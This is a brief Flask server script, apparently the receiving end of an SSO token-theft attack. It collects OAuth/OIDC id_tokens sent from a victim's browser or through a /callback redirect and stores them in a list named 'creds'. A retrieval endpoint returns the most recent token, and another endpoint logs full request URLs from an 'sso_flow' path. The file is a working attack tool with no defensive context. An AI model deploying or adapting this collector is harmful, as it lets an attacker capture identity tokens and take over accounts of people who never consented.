from flask import Flask, request, jsonify

app = Flask(__name__)

# id_tokenを保存するためのリスト
creds = []

@app.route('/data/browser', methods=['POST'])
def post_data_from_browser():
    data = request.json

    if data.get('id_token') is not None:
        creds.append({"id_token": data.get('id_token')})
    
    return "ok", 200

@app.route('/data/sso_flow/post', methods=['GET'])
def post_data_from_sso_flow():
    print(request.url)
    return "ok", 200

@app.route('/data/get', methods=['GET'])
def retrieve():
    if len(creds) == 0:
        return "no data", 200
    return creds[len(creds)-1], 200

@app.route('/callback', methods=['GET'])
def callback():
    args = request.args
    if args.get('id_token') is not None:
        creds.append({"id_token": args.get('id_token')})

    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=6666, debug=False)